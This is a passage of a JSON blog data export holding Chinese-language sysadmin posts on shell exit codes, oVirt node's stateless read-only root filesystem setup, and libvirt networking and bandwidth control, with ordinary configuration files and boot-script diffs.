d9\u4e2a\u63a5\u53e3\u4e5f\u4f1a\u88ab\u91cd\u542f\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86\u4e2d\u9014\u6709\u4e00\u4e2a\u4e2d\u65ad\u7684\u8fc7\u7a0b\uff0c\\n\\n\u90a3\u4e8b\u60c5\u5c31\u6bd4\u8f83\u6e05\u6670\u4e86\uff0c\u5982\u679c\u4f60\u5c06libvirt\u542f\u52a8\u7f51\u7edc\u7684\u6240\u6709\u8fc7\u7a0b\u62c6\u5206\u5f00\u6765\u4e00\u4e2a\u4e00\u4e2a\u7684\u624b\u52a8\u751f\u6210\uff0c\u9700\u8981\u4fee\u6539\u67d0\u4e00\u90e8\u5206\u914d\u7f6e\u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u4f60\u53ea\u9700\u8981\u4fee\u6539\u5bf9\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\u800c\u4e0d\u9700\u8981\u91cd\u65b0\u542f\u52a8\u8fd9\u4e2avirbr1\u63a5\u53e3\uff0c\u6bd4\u5982\u4e0a\u9762\u63d0\u5230\u7684mac+ip\u7684\u7ed1\u5b9a\uff0c\u5982\u679c\u628adnsmasq\u72ec\u7acb\u51fa\u6765\uff0c\u4e0d\u8ba9libvirt\u63a5\u7ba1\uff0c\u90a3\u4e48\u589e\u52a0\u4e86mac+ip\u7ed1\u5b9a\u4e4b\u540e\uff0c\u4ec5\u4ec5\u9700\u8981\u91cd\u542fdnsmasq\u8fd9\u4e2a\u670d\u52a1\u3002"},{"id":"/2013/05/17/bash-shell-exit-code","metadata":{"permalink":"/notes/blog/2013/05/17/bash-shell-exit-code","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2013-05-17-bash-shell-exit-code.md","source":"@site/blog/2013-05-17-bash-shell-exit-code.md","title":"\u6b63\u786e\u4f7f\u7528shell\u8fd4\u56de\u503c","description":"about shell exit code","date":"2013-05-17T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"},{"inline":true,"label":"exitcode","permalink":"/notes/blog/tags/exitcode"}],"readingTime":1.76,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u6b63\u786e\u4f7f\u7528shell\u8fd4\u56de\u503c","description":"about shell exit code","categories":["shell"],"tags":["bash","exitcode"]},"unlisted":false,"prevItem":{"title":"libvirt\u4e2d\u7684\u7f51\u7edc\u7ba1\u7406\u5b9e\u8df5","permalink":"/notes/blog/2013/10/01/libvirt-basic-usage"},"nextItem":{"title":"Ovirt\u4e2d\u7684stateless\u5b9e\u73b0\u673a\u5236\u5206\u6790","permalink":"/notes/blog/2013/03/14/ovirt-stateless"}},"content":"> \u7f16\u5199shell\u811a\u672c\u7684\u65f6\u5019\uff0c\u6b63\u786e\u4f7f\u7528\u8fd4\u56de\u503c\u662f\u8fd0\u7ef4\u4eba\u5458\u7684\u57fa\u672c\u64cd\u5b88\\n\\n\\n## 1.\u5e38\u89c1\u8fd4\u56de\u503c\\n\\n\u4e0b\u8868\u5217\u51fa\u4e86\u5e38\u89c1shell\u547d\u4ee4\u7684\u9000\u51fa\u8fd4\u56de\u503c\uff1a\\n\\n| \u8fd4\u56de\u503c | \u542b\u4e49 | \u793a\u4f8b | \u8bf4\u660e\\n|----|:---|:---:|---|\\n| 1  |  \u5404\u79cd\u5e38\u89c1\u9519\u8bef |   let \\"var1 = 1/0\\"  |  shell\u91cc\u9762\u6700\u5e38\u89c1\u7684\u9519\u8bef\u8fd4\u56de\u503c\\n| 2  |  shell\u5185\u5efa\u529f\u80fd\u4f7f\u7528\u9519\u8bef |   empty_function() {}  |  \u5e38\u89c1\u4e8e\u5173\u952e\u5b57\u6216\u8005\u547d\u4ee4\u51fa\u9519\\n| 126 |   \u547d\u4ee4\u65e0\u6cd5\u6267\u884c |   /dev/null  |  \u7531\u4e8e\u6743\u9650\u7b49\u5bfc\u81f4\u7684\u547d\u4ee4\u65e0\u6cd5\u6267\u884c\\n| 127 |   \u547d\u4ee4\u65e0\u6cd5\u627e\u5230 |   illegal_command |   \u4e00\u822c\u662fPATH\u73af\u5883\u53d8\u91cf\u4e0d\u5bf9\u7b49\\n| 128 |   \u9000\u51fa\u8fd4\u56de\u503c\u9519\u8bef |   exit 3.14159  |  \u8fd4\u56de\u503c\u53ea\u80fd\u662f\u6574\u6570\uff0c\u5c0f\u6570\u5c31\u4e0d\u5bf9\u4e86\\n| 128+n |    \u4fe1\u53f7 \\"n\\"+128 |   kill -9 $PPID of script |   $? \u5373\u8fd4\u56de 137 (128 + 9)\\n| 130 |   ctrl+c \u9000\u51fa |   Ctl-C  |  \u5176\u5b9ectrl+c\u8fd4\u56de\u7684\u662f2 (130 = 128 + 2)\\n| 255* |   \u8fd4\u56de\u503c\u8d85\u51fa\u53ef\u63a5\u53d7\u7684\u8303\u56f4 |   exit  -1 |   \u53ea\u80fd\u662f 0 - 255\\n\\n## 2. init\u6807\u51c6\u8fd4\u56de\u503c\\n\\n\u4e0b\u8868\u5217\u51fa\u4e86\u5173\u4e8e/etc/init.d/\u76ee\u5f55\u4e0b\u542f\u52a8\u63a7\u5236\u811a\u672c\u7684\u6807\u51c6\u8fd4\u56de\u503c\uff1a\\n\\n* 0    \u7a0b\u5e8f\u5728\u8fd0\u884c\u6216\u8005\u670d\u52a1\u72b6\u6001OK\\n* 1    \u7a0b\u5e8f\u5df2\u7ecf\u6b7b\u6389\uff0c\u4f46\u662f pid\u6587\u4ef6\u4ecd\u5728 /var/run\u76ee\u5f55\u4e0b\u5b58\u5728\\n* 2    \u7a0b\u5e8f\u5df2\u7ecf\u6b7b\u6389\uff0c\u4f46\u662flock\u6587\u4ef6\u4ecd\u5728 /var/lock \u76ee\u5f55\u4e0b\u5b58\u5728\\n* 3    \u7a0b\u5e8f\u6ca1\u6709\u8fd0\u884c\\n* 4    \u7a0b\u5e8f\u8fd0\u884c\u72b6\u6001\u672a\u77e5\\n* 5-99    \u4f9bLSB\u6269\u5c55\u7684\u4fdd\u7559\u6bb5\\n* 100-149    \u4f9b\u7279\u5b9a\u7cfb\u7edf\u53d1\u884c\u7248\u4f7f\u7528\u7684\u4fdd\u7559\u6bb5\\n* 150-199    \u4f9b\u7279\u5b9a\u7a0b\u5e8f\u4f7f\u7528\u7684\u4fdd\u7559\u6bb5\\n* 200-254    \u4fdd\u7559\u6bb5\\n\\n## 3. \u5efa\u8bae\u8fd4\u56de\u503c\\n\u5728\u5199shell\u811a\u672c\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u81ea\u5b9a\u4e49\u7684\u9000\u51fa\u8fd4\u56de\u503c\u6700\u597d\u4e0d\u8981\u4e0e\u4e0a\u9762\u8868\u683c\u4e2d\u6240\u5b9a\u4e49\u7684\u91cd\u590d\uff0c\u5bf9\u4e8e\u7ba1\u7406\u4eba\u5458\u6765\u8bf4\u517b\u6210\u826f\u597d\u7684\u4e60\u60ef\u6709\u52a9\u4e8e\u9047\u5230\u9519\u8bef\u65f6\u4f5c\u51fa\u6b63\u786e\u7684\u5224\u65ad\u3002\\n\u6839\u636e\u4e0a\u8868\u81f3\u5c11\u53ef\u4ee5\u5f97\u51fa\uff0c\u5728\u81ea\u5b9a\u4e49\u8fd4\u56de\u503c\u7684\u65f6\u5019\uff1a\\n- \u6700\u597d\u4e0d\u8981\u7528\u7684\uff1a0-4 126-130 255\\n- \u5e94\u907f\u514d\u4f7f\u7528\u7684\uff1a5-99\\n- \u53ef\u968f\u610f\u4f7f\u7528\u7684\uff1a100-125 131-254\\n\\n\u53c2\u8003\u6587\u6863:\\n\\n- [1] http://tldp.org/LDP/abs/html/exitcodes.html\\n\\n- [2] http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html"},{"id":"/2013/03/14/ovirt-stateless","metadata":{"permalink":"/notes/blog/2013/03/14/ovirt-stateless","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2013-03-14-ovirt-stateless.md","source":"@site/blog/2013-03-14-ovirt-stateless.md","title":"Ovirt\u4e2d\u7684stateless\u5b9e\u73b0\u673a\u5236\u5206\u6790","description":"\u7b80\u5355\u5206\u6790ovirt\u7684stateless\u5b9e\u73b0\u673a\u5236","date":"2013-03-14T00:00:00.000Z","tags":[{"inline":true,"label":"ovirt","permalink":"/notes/blog/tags/ovirt"},{"inline":true,"label":"stateless","permalink":"/notes/blog/tags/stateless"}],"readingTime":8.44,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"Ovirt\u4e2d\u7684stateless\u5b9e\u73b0\u673a\u5236\u5206\u6790","description":"\u7b80\u5355\u5206\u6790ovirt\u7684stateless\u5b9e\u73b0\u673a\u5236","categories":["virt","system"],"tags":["ovirt","stateless"]},"unlisted":false,"prevItem":{"title":"\u6b63\u786e\u4f7f\u7528shell\u8fd4\u56de\u503c","permalink":"/notes/blog/2013/05/17/bash-shell-exit-code"},"nextItem":{"title":"\u4f7f\u7528libvirt\u548ctc\u5b9e\u73b0vm\u5e26\u5bbd\u63a7\u5236","permalink":"/notes/blog/2013/03/01/libvirt-tc-bandwidth-control"}},"content":"> \u6211\u53d1\u73b0ovirt\u7684node\u4e5f\u5c31\u662f\u8fd0\u884c\u865a\u62df\u673a\u7684\u4e3b\u673a\u88ab\u8bbe\u8ba1\u6210\u4e86\u8fd9\u6837\uff1a\u6574\u4e2a\u6839\u6587\u4ef6\u7cfb\u7edf\u662f\u53ea\u8bfb\u7684\uff0c\u53ea\u6709\u90e8\u5206\u914d\u7f6e\u6587\u4ef6\u88ab\u72ec\u7acb\u51fa\u6765\u653e\u5230\u4e86\u53e6\u5916\u7684\u5206\u533a\uff0c\u95ee\u4e86\u51e0\u4f4dIBM\u548c\u7ea2\u5e3d\u7684\u5de5\u7a0b\u5e08\uff0c\u660e\u767d\u4e86\u4e3a\u4ec0\u4e48\u9700\u8981\u8fd9\u79cdstateless\u4e5f\u5c31\u662f\u65e0\u72b6\u6001\u7684\u8bbe\u8ba1\\n\\n\\n## Ovirt\u7b80\u4ecb\\n\u8fd9\u662f\u6765\u81eacentos wiki\u4e2d\u7684\u63cf\u8ff0\uff1a\\n> oVirt \u662f\u4e2a\u7ba1\u7406\u865a\u62df\u5316\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8a00\u4e0b\u4e4b\u610f\u5c31\u662f\u4f60\u53ef\u5229\u7528 oVirt \u7684\u7ba1\u7406\u754c\u9762\uff08oVirt \u5f15\u64ce\uff09\u6765\u7ba1\u7406\u786c\u4ef6\u8282\u70b9\u3001\u5b58\u50a8\u53ca\u7f51\u7edc\u8d44\u6e90\uff0c\u5e76\u90e8\u7f72\u53ca\u76d1\u63a7\u5728\u4f60\u7684\u6570\u636e\u4e2d\u5fc3\u5185\u8fd0\u884c\u7684\u865a\u62df\u673a\u5668\u3002\\n> \u5982\u679c\u4f60\u719f\u8bc6 VMware \u7684\u4ea7\u5668\uff0coVirt \u5728\u7406\u5ff5\u4e0a\u4e0e vSphere \u7c7b\u540c\u3002Red Hat \u4f01\u4e1a\u7ea7\u865a\u62df\u5316\u4ea7\u54c1\u4ee5 oVirt \u4f5c\u4e3a\u57fa\u7840\uff0c\u8fd9\u4e2a\u4e0a\u6e38\u8ba1\u5212\u5185\u5f00\u53d1\u7684\u65b0\u529f\u80fd\uff0c\u65e5\u540e\u4ea6\u4f1a\u5728\u83b7\u652f\u6301\u7684\u4ea7\u54c1\u5185\u51fa\u73b0\u3002\\n\\novirt\u662f\u4e00\u5957\u865a\u62df\u5316\u7ba1\u7406\u7684\u7cfb\u7edf\uff0c\u5176\u5bf9\u6807\u4ea7\u54c1\u662fvmware\u7684vsphere\uff0c\u5b83\u5206\u4e3aovirt-engine\u548covirt-node\uff0c\u53ef\u4ee5\u7528ovirt\u7684\u8fd9\u5957\u7cfb\u7edf\u6765\u7ba1\u7406\u865a\u62df\u673a\u7fa4\uff0c\u73b0\u5728\u865a\u62df\u5316\u76f8\u5173\u4ea7\u54c1\u4f17\u591a\uff0c\u5fae\u8f6f\uff0cvmware\uff0coracle\u7b49\u90fd\u5728\u505a\u8fd9\u65b9\u9762\u7684\u4ea7\u54c1\uff0c\u4e8e\u662fIBM\u7ea2\u5e3dubuntu\u7b49\u5382\u5546\u5c31\u8054\u5408\u8d77\u6765\u5f00\u59cb\u641e\u8fd9\u4e2a\u4e1c\u897f\u4e86\uff0c\u7ea2\u5e3d\u5f88\u65e9\u5c31\u5f00\u59cb\u6295\u5165kvm\u4e86\uff0c\u7ea2\u5e3d\u505a\u7684\u662fRHEV\u7684\u6574\u5957\u7cfb\u7edf\uff0c\u4e5f\u5206\u4e3anode\u548cengine\u53ea\u662f\u540d\u5b57\u4e0d\u4e00\u6837\uff0c\u540e\u6765\u5e72\u8106\u5c31\u628anode\u7684RHEV-H\u7ed9\u8d21\u732e\u51fa\u6765\uff0c\u5927\u5bb6\u4e00\u8d77\u641eovirt\u4e86\u3002\u524d\u51e0\u5929\u6211\u4e5f\u8bd5\u7528\u4e86\u4e00\u4e0bovirt\u548cRHEV\uff0c\u53d1\u73b0\u4ed6\u4eec\u7684node\u4e5f\u5c31\u662f\u8fd0\u884c\u865a\u62df\u673a\u7684\u4e3b\u673a\u88ab\u8bbe\u8ba1\u6210\u4e86\u8fd9\u6837: \u6574\u4e2a\u6839\u6587\u4ef6\u7cfb\u7edf\u662f\u53ea\u8bfb\u7684\uff0c\u53ea\u6709\u90e8\u5206\u914d\u7f6e\u6587\u4ef6\u88ab\u72ec\u7acb\u51fa\u6765\u653e\u5230\u4e86\u53e6\u5916\u7684\u5206\u533a\uff0c\u95ee\u4e86\u51e0\u4f4dIBM\u548c\u7ea2\u5e3d\u7684\u5de5\u7a0b\u5e08\uff0c\u624d\u77e5\u9053\u8fd9\u53ebstateless\uff0c\u65e0\u72b6\u6001\uff0c\u8fd9\u4e48\u505a\u7684\u597d\u5904\u662f\u8fd0\u884c\u73af\u5883\u548c\u5b58\u50a8\u5206\u79bb\uff0c\u63d0\u9ad8\u6574\u4f53\u53ef\u7528\u6027\u3002\u5728\u5206\u6790\u4e86ovirt\u4e2d\u7684stateless\u5b9e\u73b0\u673a\u5236\u4e4b\u540e\uff0c\u4e0b\u9762\u5c06\u5728centos6\u4e0a\u5c1d\u8bd5\u624b\u5de5\u914d\u7f6e\uff0c\u8fc7\u7a0b\u4e2d\u8bf7\u6559\u4e86\u51e0\u4f4dovirt\u7684\u5f00\u53d1,\u518d\u6b21\u8868\u793a\u611f\u8c22\\n\\n## \u5173\u4e8estateless\\n\u8fd9\u79cdstateless\u7684\u8bbe\u8ba1\u6765\u81ea\u5f88\u65e9\u4e4b\u524d\u7ea2\u5e3d\u5728fedora\u91cc\u9762\u505a\u7684\u5c1d\u8bd5\uff0c\u76ee\u7684\u662f\u628a\u7cfb\u7edf\u505a\u6210liveCD\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u5173\u4e8estateless\u7684\u63cf\u8ff0\uff1a\\n\\n```\\nread-only root file system(stateless linux)\\nReadonly root support.\\nThis was add to Fedora for Stateless Linux, i.e. for creating live Fedora CDs.\\nHow to use:\\n   * Edit `/etc/sysconfig/readonly-root`. Set \'READONLY\' to \'yes\'.\\n   * Add any exceptions that need to be writable that aren\'t in the stock `/etc/rwtab` to an /etc/rwtab.d file. (See below)\\nHow it works:\\n   * On boot, we mount a tmpfs (by default, at /var/lib/stateless/writable), and then parse `/etc/rwtab` and `/etc/rwtab.d/*` for things to put there.\\nThese files have the format:\\n`<type>  <path>`\\n\\n* Types are as follows:\\n  * empty: An empty path. Example:\\n              `empty     /tmp`\\n  * dirs: A directory tree that is copied, empty. Example:\\n              `dirs      /var/run`\\n  * files: A file or directory tree that is copied intact. Example:\\n              `files     /etc/resolv.conf`\\n\\nA stock rwtab is shipped with common things that need mounted.\\nWhen your computer comes back up, the root and any other system\\npartitions will be mounted read-only. All the files and directories\\nlisted in `/etc/rwtab` will be mounted read-write on a tmpfs filesystem.\\nYou can add additional files and directories to rwtab to make them\\nwritable after reboot.\\n\\nNote that this system is stateless. When you reboot again, everything\\nwritten to the tmpfs filesystem vanishes and the system will be exactly\\nas it was the last time it was booted. You could add a writable\\nfilesystem on disk or NFS for writing files you want to retain after\\nrebooting.\\n\\nTake a look at `/etc/rc.d/rc.sysinit` to see how the magic is done.\\nThis capability is a \\"technology preview\\" (beta) and is buggy. Note that\\n`/etc/mtab` and thus \\"mount\\" do not show the complete list of filesystems\\nbecause the /etc directory is on a read-only filesystem. /proc/mounts\\nalways shows the correct mount information. You could update `/etc/mtab`\\nfrom /proc/mounts to correct it both after boot and after running the\\nmount or umount commands to change mounts.\\n\\nRun `fgrep -v rootfs /proc/mounts >/etc/mtab` to correct `/etc/mtab`.\\nNote that mounting or symlinking /proc/mounts to /etc/mtab causes other\\nproblems such as breaking the df command.\\n\\nYou can change your read-only root filesystem to read-write mode\\nimmediately with this command run by the root user:\\n`mount -n -o remount,rw /`\\n```\\n\\n## \u5206\u6790\u5176\u5b9e\u73b0\u673a\u5236\\n\\n\u4e0b\u9762\u628a\u5206\u6790\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\uff1a\\n\\n\u9996\u5148\u6211\u770b\u5230\u7684\u662ffstab\u6587\u4ef6\\n\\n/etc/fstab\\n~~~\\n/dev/root / ext2 defaults,ro,noatime 0 0\\ndevpts /dev/pts devpts gid=5,mode=620 0 0\\ntmpfs /dev/shm tmpfs defaults 0 0\\nproc /proc proc defaults 0 0\\nsysfs /sys sysfs defaults 0 0\\n/dev/HostVG/Config /config ext4 defaults,noauto,noatime 0 0\\ndebugfs /sys/kernel/debug debugfs 0 0\\n/dev/HostVG/Swap swap swap defaults 0 0\\n/dev/HostVG/Logging /var/log ext4 defaults,noatime 0 0\\n/dev/HostVG/Data /data ext4 defaults,noatime 0 0\\n/data/images /var/lib/libvirt/images bind bind 0 0\\n/data/core /var/log/core bind bind 0 0\\n~~~\\n\\n\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u5730\u65b9\u5c31\u662froot\u540e\u9762\u7684ro\uff0c\u4e5f\u5c31\u662f\u8bf4\u88ab\u6302\u8f7d\u6210\u4e86\u53ea\u8bfb\uff0c\u8fd9\u8bf4\u660estateless\u662f\u5728\u6302\u8f7d\u78c1\u76d8\u4e4b\u524d\u5c31\u5df2\u7ecf\u5b8c\u6210\uff0c\u90a3\u80af\u5b9a\u8ddf\u7cfb\u7edf\u542f\u52a8\u76f8\u5173\uff0c\\n\u63a5\u7740\u6211\u4eec\u627e\u5230rc.sysinit\u8fd9\u4e2a\u5728\u7cfb\u7edf\u542f\u52a8\u9636\u6bb5\u6267\u884c\u7684\u811a\u672c\u4e2d\u4e0b\u9762\u8fd9\u6bb5\u5185\u5bb9:\\n\\n/etc/rc.d/rc.sysinit\\n~~~bash\\nfor file in /etc/statetab /etc/statetab.d/* ; do\\n    is_ignored_file \\"$file\\" && continue\\n    [ ! -f \\"$file\\" ] && continue\\n\\n    if [ -f \\"$STATE_MOUNT/$file\\" ] ; then\\n        mount -n --bind \\"$STATE_MOUNT/$file\\" \\"$file\\"\\n    fi\\n\\n    for path in $(grep -v \\"^#\\" \\"$file\\" 2>/dev/null); do\\n        mount_state \\"$path\\"\\n        [ -n \\"$SELINUX_STATE\\" -a -e \\"$path\\" ] && restorecon -R \\"$path\\"\\n    done\\ndone\\n~~~\\n\\n\u8fd9\u6bb5shell\u91cc\u9762\u7275\u626f\u5230\u4e86\u4e2a/etc/statetab,\u800c\u4e14\u901a\u8fc7\u5bf9\u6bd4\u666e\u901a\u7cfb\u7edf\u8fd8\u53d1\u73b0\u5176\u4ed6\u5730\u65b9\u7684\u4e0d\u540c\\n\\n\\ndiff rc.sysinit /etc/rc.sysinit\\n~~~\\n102a103,108\\n> elif [[ \\"$system_release\\" =~ \\"CentOS\\" ]]; then\\n> [ \\"$BOOTUP\\" = \\"color\\" ] && echo -en \\"\\\\\\\\033[0;36m\\"\\n> echo -en \\"CentOS\\"\\n> [ \\"$BOOTUP\\" = \\"color\\" ] && echo -en \\"\\\\\\\\033[0;39m\\"\\n> PRODUCT=$(sed \\"s/CentOS \\\\(.*\\\\) \\\\?release.*/\\\\1/\\" /etc/system-release)\\n> echo \\" $PRODUCT\\"\\n499c505\\n< action $\\"Mounting local filesystems: \\" mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev\\n---\\n> action $\\"Mounting local filesystems: \\" mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev\\n501c507\\n< action $\\"Mounting local filesystems: \\" mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev\\n---\\n> action $\\"Mounting local filesystems: \\" mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev\\n~~~\\n\\n\u63a5\u7740\u770b\u770b\u8fd9\u4e2a/etc/statetab\u6587\u4ef6\u662f\u4e2a\u4ec0\u4e48\u6837\u5b50\u7684\uff1a\\n\\n/etc/statetab\\n~~~\\n# A list of paths which should be bind-mounted from a\\n# partition dedicated to persistent data\\n#\\n# See $STATE_LABEL in /etc/sysconfig/readonly-root\\n#\\n# Examples:\\n#\\n# /root\\n# /etc/ssh\\n# /var/spool/mail\\n~~~\\n\\n\u987a\u85e4\u6478\u74dc\u6211\u4eec\u53d1\u73b0\u548c/etc/sysconfig/readonly-root\u8fd9\u4e2a\u6587\u4ef6\u6709\u5173\uff0c\u4ece\u6587\u4ef6\u540d\u4e0a\u5373\u53ef\u5f97\u77e5\u548c\u53ea\u8bfb\u7684\u5173\u8054\uff1a\\n\\n/etc/sysconfig/readonly-root\\n~~~bash\\nSet to \'yes\' to mount the system filesystems read-only.\\nREADONLY=yes\\n# Set to \'yes\' to mount various temporary state as either tmpfs\\n# or on the block device labelled RW_LABEL. Implied by READONLY\\nTEMPORARY_STATE=no\\n# Place to put a tmpfs for temporary scratch writable space\\nRW_MOUNT=/var/lib/stateless/writable\\n# Label on local filesystem which can be used for temporary scratch space\\nRW_LABEL=stateless-rw\\n# Options to use for temporary mount\\nRW_OPTIONS=\\n# Label for partition with persistent data\\nSTATE_LABEL=CONFIG \\n# Where to mount to the persistent data\\nSTATE_MOUNT=/config\\n# Options to use for peristent mount\\nSTATE_OPTIONS=\\n# NFS server to use for persistent data?\\nCLIENTSTATE=\\n~~~\\n\\n\u5c31\u662f\u8fd9\u4e2a\u4e86\uff0c\u9996\u5148\u5b83\u628aREADONLY\u8bbe\u7f6e\u4e3ayes\uff0c\u7136\u540e\u4f7f\u7528\u8bbe\u5907\u7684LABEL\u53f7\u6765\u6307\u5b9a\u9700\u8981\u6302\u8f7d\u4e3a\u8bfb\u5199\u7684\u8bbe\u5907\uff0c\u7136\u540e\u5c31\u662f\u6302\u8f7d\u7684\u4f4d\u7f6eSTATE_MOUNT\\n\\n\u540c\u65f6\u8fd8\u6709/etc/rwtab\u4ee5\u53carwtab.d\u76ee\u5f55\u4e0e\u8fd9\u4e2a\u6709\u5173\uff1a\\n/etc/rwtab\\n~~~\\n#files /etc/adjtime\\n#files /etc/ntp.conf\\n#files /etc/resolv.conf\\n#files /etc/lvm/.cache\\n#files /etc/lvm/archive\\n#files /etc/lvm/backup\\n~~~\\n\\n\u4e0a\u9762\u8fd9\u51e0\u9879\u5728ovirt-node\u91cc\u662f\u88ab\u6ce8\u91ca\u6389\u4e86\u7684\uff0c\u5b83\u4f7f\u7528\u81ea\u5df1\u7684\u65b9\u5f0f\u6765\u53d8\u66f4\u8fd9\u51e0\u4e2a\u6587\u4ef6\\n\\n/etc/rwtab.d/ovirt\\n~~~\\nfiles /etc\\ndirs /var/lib/multipath\\ndirs /var/lib/net-snmp\\ndirs /var/lib/dnsmasq\\nfiles /root/.ssh\\ndirs /root/.uml\\ndirs /root/.virt-manager\\ndirs /home/admin/.virt-manager\\nfiles /var/cache/libvirt\\nfiles /var/empty/sshd/etc/localtime\\nfiles /var/lib/libvirt\\nfiles /var/lib/multipath\\nfiles /var/cache/multipathd\\nempty /mnt\\nempty /live\\nfiles /boot\\nempty /boot-kdump\\nempty /cgroup\\n~~~\\n\\n\u4e0a\u9762\u8fd9\u4e9b\u662fovirt\u81ea\u5b9a\u4e49\u7684\u3002\u6700\u540e\u5c31\u662f\u770b/config\u4e0b\u9762\u7684files\u6587\u4ef6:\\n\\n/config/files\\n~~~\\n/etc/fstab\\n/etc/shadow\\n/etc/default/ovirt\\n/etc/ssh/ssh_host_key\\n/etc/ssh/ssh_host_key.pub\\n/etc/ssh/ssh_host_dsa_key\\n/etc/ssh/ssh_host_dsa_key.pub\\n/etc/ssh/ssh_host_rsa_key\\n/etc/ssh/ssh_host_rsa_key.pub\\n/etc/iscsi/initiatorname.iscsi\\n/etc/sysconfig/network-scripts/ifcfg-eth0\\n/etc/sysconfig/network-scripts/ifcfg-breth0\\n/etc/sysconfig/network-scripts/ifcfg-eth1\\n/etc/ntp.conf\\n/etc/sysconfig/network\\n/etc/hosts\\n/etc/shadow\\n/etc/ssh/sshd_config\\n~~~\\n\\n\u6b64\u5217\u8868\u5185\u7684\u6587\u4ef6\u5c31\u662frc.sysinit\u9700\u8981\u8bfb\u53d6\u7684\uff0c\u628a\u4ed6\u4eec\u4e00\u4e2a\u4e2a\u6302\u8f7d\u4e3a\u8bfb\u5199\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u53ef\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u767d\u540d\u5355\uff0c\u4e8e\u662f\u6211\u5c31\u52a8\u624b\u4fee\u6539\u4e86\u7cfb\u7edf\u91cc\u7684\u8fd9\u4e9b\u6587\u4ef6\uff0c\u91cd\u542f\uff0c\u4e00\u5207\u770b\u4f3c\u6b63\u5e38\uff0c\u4f46\u662f\u5f53\u5173\u673a\u7684\u65f6\u5019\u65b0\u7684\u95ee\u9898\u51fa\u73b0\u4e86\uff0c\u5173\u673a\u7684\u65f6\u5019\u63d0\u793a/etc\u65e0\u6cd5\u88ab\u5378\u8f7d\uff0c\u4e3a\u4ec0\u4e48\u5462\uff0c\u7136\u540e\u5c31\u627e\u5230\u4e0e\u5173\u673a\u6709\u5173\u7684\u811a\u672c\uff1a\\n\\ndiff /etc/rc.d/init.d/halt.orig /etc/rc.d/init.d/halt\\n~~~\\n141c141\\n< LANG=C __umount_loop \'$2 ~ /^\\\\/$|^\\\\/proc|^\\\\/dev/{next}\\n---\\n> LANG=C __umount_loop \'$2 ~ /^\\\\/$|^\\\\/proc|^\\\\/etc|^\\\\/dev/{next}\\n~~~\\n\\n\u539f\u6765\u5728halt\u6587\u4ef6\u91cc\u4e5f\u505a\u4e86\u201c\u624b\u811a\u201d\uff0c\u628a/etc\u7ed9\u52a0\u4e86\u8fdb\u53bb\uff0c\u91cd\u542f\uff0c\u4fee\u6539\uff0c\u5173\u673a\uff0c\u4e00\u5207\u6b63\u5e38\u3002\\n\\n## \u53c2\u8003\u6587\u6863\\n\u4e0b\u9762\u662f\u53ef\u4ee5\u53c2\u8003\u7684\u6587\u6863\\n\\n- http://fedoraproject.org/wiki/StatelessLinux/PrepareImage\\n- http://fedoraproject.org/wiki/StatelessLinux/HOWTO\\n- http://blog.csdn.net/jcwkyl/article/details/6120547\\n- http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem\\n- FYI: http://ovirt.org/wiki/File:Ovirt-node.pdf (page 26)"},{"id":"/2013/03/01/libvirt-tc-bandwidth-control","metadata":{"permalink":"/notes/blog/2013/03/01/libvirt-tc-bandwidth-control","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2013-03-01-libvirt-tc-bandwidth-control.md","source":"@site/blog/2013-03-01-libvirt-tc-bandwidth-control.md","title":"\u4f7f\u7528libvirt\u548ctc\u5b9e\u73b0vm\u5e26\u5bbd\u63a7\u5236","description":"","date":"2013-03-01T00:00:00.000Z","tags":[{"inline":true,"label":"libvirt","permalink":"/notes/blog/tags/libvirt"},{"inline":true,"label":"tc","permalink":"/notes/blog/tags/tc"},{"inline":true,"label":"bandwidth","permalink":"/notes/blog/tags/bandwidth"}],"readingTime":2.97,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528libvirt\u548ctc\u5b9e\u73b0vm\u5e26\u5bbd\u63a7\u5236","description":"","categories":["virt"],"tags":["libvirt","tc","bandwidth"]},"unlisted":false,"prevItem":{"title":"Ovirt\u4e2d\u7684stateless\u5b9e\u73b0\u673a\u5236\u5206\u6790","permalink":"/notes/blog/2013/03/14/ovirt-stateless"},"nextItem":{"title":"\u6d45\u6790qcow2\u955c\u50cf\u6587\u4ef6\u7684\u5feb\u7167\u5408\u5e76","permalink":"/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull"}},"content":"> \u5728kvm\u865a\u62df\u673a\u7ba1\u7406\u7684\u8fc7\u7a0b\u5f53\u4e2d\uff0c\u5bf9\u865a\u62df\u673a\u5e26\u5bbd\u8fdb\u884c\u826f\u597d\u7684\u63a7\u5236\u662f\u5341\u5206\u91cd\u8981\u7684\u3002\\n\\n\\n\\nlinux\u7cfb\u7edf\u5f53\u4e2d\u5bf9\u7f51\u7edc\u5e26\u5bbd\u7684\u63a7\u5236\u4e00\u822c\u90fd\u662f\u4f7f\u7528tc\u547d\u4ee4\u5b9e\u73b0\uff0ctc\u5373\u662ftraffic 